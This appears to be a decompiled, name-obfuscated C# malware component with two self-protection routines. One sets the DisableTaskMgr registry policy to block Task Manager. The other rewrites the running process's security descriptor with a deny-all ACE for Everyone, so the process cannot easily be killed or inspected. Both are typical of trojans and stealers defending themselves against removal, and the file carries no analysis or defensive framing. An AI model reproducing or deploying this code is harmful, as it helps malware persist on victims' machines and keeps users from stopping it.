using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace CvZbjvYtYnj;

internal sealed class VcXniFwGXSvG
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr QDcglokafqeSm, int emGSZvHRDLxg, [Out] byte[] eOjAMcgeoupJOOvi, uint CvWLZTKYrRg, out uint TmbLtmITFtxjW);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr nZHskvWGYZgDQyZ, int etmzqWMBpGfGLl, [In] byte[] gYAnlSyBiyLd);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void oJSfQkukKv(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor OgODqVcWfvJwMA(IntPtr intptr_0)
	{
		byte[] eOjAMcgeoupJOOvi = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, eOjAMcgeoupJOOvi, 0u, out var TmbLtmITFtxjW);
		if ((long)TmbLtmITFtxjW > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, eOjAMcgeoupJOOvi = new byte[TmbLtmITFtxjW], TmbLtmITFtxjW, out TmbLtmITFtxjW))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(eOjAMcgeoupJOOvi, 0);
	}

	private void yqhywfYaNSh(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void GZMvQobXXUkJ()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = OgODqVcWfvJwMA(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		yqhywfYaNSh(currentProcess, rawSecurityDescriptor);
	}
}
